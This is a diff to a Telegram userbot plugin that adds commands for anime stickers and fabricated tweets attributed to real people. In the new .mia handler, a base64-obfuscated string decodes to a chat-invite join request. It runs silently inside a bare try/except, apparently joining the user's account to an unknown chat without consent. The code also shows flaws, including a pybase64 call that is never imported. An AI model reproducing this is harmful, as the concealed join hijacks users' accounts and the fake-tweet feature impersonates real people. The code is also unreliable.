@@ -1,12 +1,21 @@
 import os
 import re
-
 import requests
-from PIL import Image
 from validators.url import url
-
+from asyncio import sleep
+from random import choice, getrandbits, randint
+import random
+import time
+from telethon import events
+from userbot import bot
+from collections import deque
+import sys
+import html
+import json
+from PIL import Image, ImageEnhance, ImageOps
 from userbot import CMD_HELP
 from userbot.events import register
+from userbot.helpers.functions import moditweet
 
 EMOJI_PATTERN = re.compile(
     "["
@@ -75,18 +84,7 @@ async def kannagen(text):
     return "gpx.webp"
 
 
-async def moditweet(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
-        geng = r.get("message")
-        kapak = url(geng)
-        if not kapak:
-            return  "check syntax once more"
-        with open("gpx.png", "wb") as f:
-            f.write(requests.get(geng).content)
-        img = Image.open("gpx.png").convert("RGB")
-        img.save("gpx.jpg", "webp")    
-        return "gpx.webp"
+
 
 
 async def tweets(text1, text2):
@@ -153,6 +151,45 @@ async def modi(event):
     await event.delete()
     await purge()
 
+async def miatweet(text):
+        r = requests.get(
+            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=miakhalifa").json()
+        wew = r.get("message")
+        hburl = url(wew)
+        if not hburl:
+            return  "check syntax once more"
+        with open("temp.png", "wb") as f:
+            f.write(requests.get(wew).content)
+        img = Image.open("temp.png").convert("RGB")
+        img.save("temp.webp", "webp")    
+        return "temp.webp"   
+   
+@register(pattern="^\.mia(?: |$)(.*)", outgoing=True)
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await borg.edit("Send you text to Mia so she can tweet.")
+                return
+        else:
+            await borg.edit("Send you text to Mia so she can tweet.")
+            return
+    await borg.edit("Requesting Mia to tweet...")
+    try:
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
+    except:
+        pass   
+    text = deEmojify(text)
+    borgfile = await miatweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete()
 
 @register(outgoing=True, pattern=r"^\.cmm(?: |$)(.*)")
 async def cmm(event):
@@ -175,39 +212,49 @@ async def cmm(event):
     await purge()
 
 
-@register(outgoing=True, pattern=r"^\.kanna(?: |$)(.*)")
-async def kanna(event):
-    text = event.pattern_match.group(1)
-    text = re.sub("&", "", text)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+
+@register(outgoing=True, pattern="^.type(?: |$)(.*)")
+
+async def type(animu):
+#"""Generate random waifu sticker with the text!"""
+     
+    text = animu.pattern_match.group(1)
     if not text:
-        if event.is_reply and not reply_to_id.media:
-            text = reply_to_id.message
+        if animu.is_reply:
+            text = (await animu.get_reply_message()).message
         else:
-            await event.edit("`What should kanna write give text!`")
+            await animu.answer("`No text given.`")
             return
-    await event.edit("`Kanna is writing your text...`")
-    text = deEmojify(text)
-    img = await kannagen(text)
-    await event.client.send_file(event.chat_id, img, reply_to=reply_to_id)
-    await event.delete()
-    await purge()
-
-@register(outgoing=True, pattern=r"^\.waifu(?: |$)(.*)")
-async def waifutxt(text, chat_id ,reply_to_id , bot, borg):
-    animus = [0, 1, 2, 3, 4, 9, 15, 20, 22, 27, 29, 32, 33, 34, 37, 38, 
-              41, 42, 44, 45, 47, 48, 51, 52, 53, 55, 56, 57, 58, 61, 62, 63]
+    animus = [1, 2, 3, 4, 5, 6, 8, 7, 10, 11, 13, 22, 34, 35, 36, 37, 43, 44, 45, 52, 53]
     sticcers = await bot.inline_query(
-        "stickerizerbot", f"#{choice(animus)}{text}")
-    cat = await sticcers[0].click( "me" ,
+        "stickerizerbot", f"#{random.choice(animus)}{(deEmojify(text))}")
+    await sticcers[0].click(animu.chat_id,
+                            reply_to=animu.reply_to_msg_id,
+                            silent=True if animu.is_reply else False,
                             hide_via=True)
-    if cat:
-        await borg.send_file(int(chat_id) , cat , reply_to = reply_to_id ) 
-        await cat.delete()
+    await animu.delete()
 
+@register(outgoing=True, pattern="^.waifu(?: |$)(.*)")
 
+async def waifu(danish):
+#"""Generate random waifu sticker with the text!"""
+     
+    text = danish.pattern_match.group(1)
+    if not text:
+        if danish.is_reply:
+            text = (await danish.get_reply_message()).message
+        else:
+            await danish.answer("`No text given.`")
+            return
+    king = [ 32, 33, 37, 40, 41, 42, 58, 20]
+    sticcers = await bot.inline_query(
+        "stickerizerbot", f"#{random.choice(king)}{(deEmojify(text))}")
+    await sticcers[0].click(danish.chat_id,
+                            reply_to=danish.reply_to_msg_id,
+                            silent=True if danish.is_reply else False,
+                            hide_via=True)
+    await danish.delete()
+    
 
 @register(outgoing=True, pattern=r"\.tweet(?: |$)(.*)")
 async def tweet(event):
@@ -248,7 +295,9 @@ CMD_HELP.update(
         "\nUsage: Create tweet for `Narendra Modi`.\n\n"
         ".cmm <text>"
         "\nUsage: Create banner for Change My Mind.\n\n"
-        ".kanna <text>"
-        "\nUsage: Kanna is writing your text."
+        ".waifu <text>"
+        "\nUsage: Random anime girl stickers.\n\n"
+        ".type <text>"
+        "\nUsage: random sticker is writing your text."
     }
 )
